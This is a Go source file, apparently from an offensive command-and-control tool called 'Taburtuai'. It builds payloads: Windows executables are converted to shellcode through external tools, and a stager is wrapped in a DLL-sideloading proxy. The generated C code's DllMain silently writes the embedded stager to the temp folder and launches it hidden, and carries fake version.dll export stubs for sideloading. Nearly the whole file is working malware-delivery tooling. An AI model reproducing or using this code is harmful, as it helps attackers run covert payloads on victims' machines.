package main

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// pe2Shellcode converts a Windows PE (EXE) to position-independent shellcode.
//
// Strategy (tried in order):
//  1. donut         — https://github.com/TheWover/donut
//  2. sRDI.py       — https://github.com/monoxgas/sRDI
//  3. pe_to_shellcode — https://github.com/hasherezade/pe_to_shellcode
//  4. Error with install guidance (no broken fallback)
func pe2Shellcode(pe []byte) ([]byte, error) {
	if len(pe) < 64 {
		return nil, fmt.Errorf("input is too small to be a PE")
	}
	if pe[0] != 'M' || pe[1] != 'Z' {
		return nil, fmt.Errorf("input does not start with MZ header")
	}

	if sc, err := tryDonut(pe); err == nil {
		fmt.Println("[+] Shellcode generated via donut")
		return sc, nil
	}

	if sc, err := trySRDIPython(pe); err == nil {
		fmt.Println("[+] Shellcode generated via sRDI.py")
		return sc, nil
	}

	if sc, err := tryPe2Shellcode(pe); err == nil {
		fmt.Println("[+] Shellcode generated via pe_to_shellcode")
		return sc, nil
	}

	return nil, fmt.Errorf(
		"no shellcode converter found in PATH.\n\n" +
			"Install one of the following, then re-run:\n\n" +
			"  1. donut (recommended)\n" +
			"       go install github.com/TheWover/donut/v3@latest\n" +
			"       -- or -- download from https://github.com/TheWover/donut/releases\n\n" +
			"  2. sRDI (Python)\n" +
			"       git clone https://github.com/monoxgas/sRDI\n" +
			"       python3 sRDI/Python/ConvertToShellcode.py <pe_file>\n\n" +
			"  3. pe_to_shellcode (hasherezade)\n" +
			"       https://github.com/hasherezade/pe_to_shellcode/releases\n\n" +
			"Alternatively use --format dll (DLL sideloading) which requires only mingw:\n" +
			"  apt install mingw-w64  # or: brew install mingw-w64",
	)
}

// trySRDIPython attempts to use the monoxgas sRDI Python script to convert PE→shellcode.
// Looks for ConvertToShellcode.py or sRDI.py in PATH or common locations.
func trySRDIPython(pe []byte) ([]byte, error) {
	py, err := exec.LookPath("python3")
	if err != nil {
		py, err = exec.LookPath("python")
		if err != nil {
			return nil, fmt.Errorf("python not in PATH")
		}
	}

	// Search for the conversion script in common locations.
	scriptNames := []string{"ConvertToShellcode.py", "sRDI.py"}
	var script string
	for _, name := range scriptNames {
		if path, err := exec.LookPath(name); err == nil {
			script = path
			break
		}
		// Check next to the python binary
		candidate := filepath.Join(filepath.Dir(py), name)
		if _, err := os.Stat(candidate); err == nil {
			script = candidate
			break
		}
	}
	if script == "" {
		return nil, fmt.Errorf("sRDI Python script not found")
	}

	tmpDir, err := os.MkdirTemp("", "taburtuai-srdi-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	inFile := filepath.Join(tmpDir, "input.exe")
	outFile := filepath.Join(tmpDir, "input.bin")
	if err := os.WriteFile(inFile, pe, 0644); err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	cmd := exec.Command(py, script, inFile)
	cmd.Dir = tmpDir
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("sRDI.py: %v\n%s", err, buf.String())
	}

	return os.ReadFile(outFile)
}

// tryPe2Shellcode attempts to use hasherezade's pe_to_shellcode tool.
func tryPe2Shellcode(pe []byte) ([]byte, error) {
	tool, err := exec.LookPath("pe_to_shellcode")
	if err != nil {
		tool, err = exec.LookPath("pe2shc")
		if err != nil {
			return nil, fmt.Errorf("pe_to_shellcode not in PATH")
		}
	}

	tmpDir, err := os.MkdirTemp("", "taburtuai-pe2shc-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	inFile := filepath.Join(tmpDir, "input.exe")
	outFile := filepath.Join(tmpDir, "input.shc.exe")
	if err := os.WriteFile(inFile, pe, 0644); err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	cmd := exec.Command(tool, inFile, outFile)
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("pe_to_shellcode: %v\n%s", err, buf.String())
	}

	return os.ReadFile(outFile)
}

// tryDonut attempts to use the donut CLI to convert PE→shellcode.
// donut: https://github.com/TheWover/donut
func tryDonut(pe []byte) ([]byte, error) {
	donutPath, err := exec.LookPath("donut")
	if err != nil {
		return nil, fmt.Errorf("donut not in PATH")
	}

	tmpDir, err := os.MkdirTemp("", "taburtuai-donut-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	inFile := filepath.Join(tmpDir, "input.exe")
	outFile := filepath.Join(tmpDir, "loader.bin")

	if err := os.WriteFile(inFile, pe, 0644); err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	cmd := exec.Command(donutPath, "-i", inFile, "-o", outFile, "-a", "2") // -a 2 = x64
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("donut: %v\n%s", err, buf.String())
	}

	return os.ReadFile(outFile)
}


// ── DLL sideloading ───────────────────────────────────────────────────────────

// buildSideloadDLL generates a Windows DLL suitable for DLL sideloading.
//
// Strategy:
//  1. mingw32 in PATH  — compiles a proper C proxy DLL that embeds+runs the stager
//  2. Fallback         — writes the C source to disk + instructions
func buildSideloadDLL(o compileOpts) ([]byte, error) {
	// First compile the EXE stager
	exePath, tmpDir, err := compileStager(o)
	if err != nil {
		return nil, fmt.Errorf("compile stager: %w", err)
	}
	if tmpDir != "" {
		defer os.RemoveAll(tmpDir)
	}

	exeBytes, err := os.ReadFile(exePath)
	if err != nil {
		return nil, err
	}

	// Generate C source for the proxy DLL
	csrc := buildProxyDLLSource(exeBytes)

	// Try to compile with mingw
	gcc := findMingw()
	if gcc == "" {
		// Save source and return instructions error
		srcPath := "sideload.c"
		_ = os.WriteFile(srcPath, []byte(csrc), 0644)
		return nil, fmt.Errorf(
			"mingw not found. C source saved to %s\n"+
				"Compile manually:\n"+
				"  x86_64-w64-mingw32-gcc -shared -o version.dll %s\n"+
				"  (install: apt install mingw-w64 / brew install mingw-w64)",
			srcPath, srcPath,
		)
	}

	tmpSrc := filepath.Join(os.TempDir(), "taburtuai_dll.c")
	tmpOut := filepath.Join(os.TempDir(), "taburtuai.dll")
	defer os.Remove(tmpSrc)
	defer os.Remove(tmpOut)

	if err := os.WriteFile(tmpSrc, []byte(csrc), 0644); err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	cmd := exec.Command(gcc, "-shared", "-s", "-o", tmpOut, tmpSrc,
		"-lkernel32", "-Wl,--enable-stdcall-fixup")
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("gcc: %v\n%s", err, buf.String())
	}

	dllBytes, err := os.ReadFile(tmpOut)
	if err != nil {
		return nil, err
	}
	fmt.Printf("[+] DLL compiled: %d KB via %s\n", len(dllBytes)/1024, gcc)
	return dllBytes, nil
}

// buildProxyDLLSource generates C source for a sideloading DLL.
// DllMain drops the embedded stager to %TEMP% and executes it silently.
func buildProxyDLLSource(exeBytes []byte) string {
	// Embed EXE as C array
	var sb strings.Builder
	sb.WriteString("/* Taburtuai sideload DLL — auto-generated */\n")
	sb.WriteString("#include <windows.h>\n#include <stdio.h>\n\n")
	sb.WriteString("static const unsigned char payload[] = {\n")
	for i, b := range exeBytes {
		if i%16 == 0 {
			sb.WriteString("  ")
		}
		fmt.Fprintf(&sb, "0x%02x,", b)
		if i%16 == 15 {
			sb.WriteString("\n")
		}
	}
	sb.WriteString("\n};\n\n")
	sb.WriteString(`static void run_payload(void) {
    char tmp[MAX_PATH];
    char tmpf[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    snprintf(tmpf, MAX_PATH, "%s%lu.exe", tmp, GetTickCount());

    HANDLE hf = CreateFileA(tmpf, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;
    DWORD written = 0;
    WriteFile(hf, payload, sizeof(payload), &written, NULL);
    CloseHandle(hf);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessA(tmpf, NULL, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL; (void)lpvReserved;
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        run_payload();
    }
    return TRUE;
}

/* Common sideload export stubs — extend as needed for target DLL */
__declspec(dllexport) void GetFileVersionInfoA(void){}
__declspec(dllexport) void GetFileVersionInfoSizeA(void){}
__declspec(dllexport) void VerQueryValueA(void){}
`)
	return sb.String()
}

// findMingw returns the path to a mingw gcc cross-compiler for Windows x64,
// checking common names in order.
func findMingw() string {
	candidates := []string{
		"x86_64-w64-mingw32-gcc",
		"x86_64-w64-mingw32-gcc-posix",
		"x86_64-w64-mingw32-gcc-win32",
		"mingw32-gcc",
	}
	for _, name := range candidates {
		if path, err := exec.LookPath(name); err == nil {
			return path
		}
	}
	return ""
}
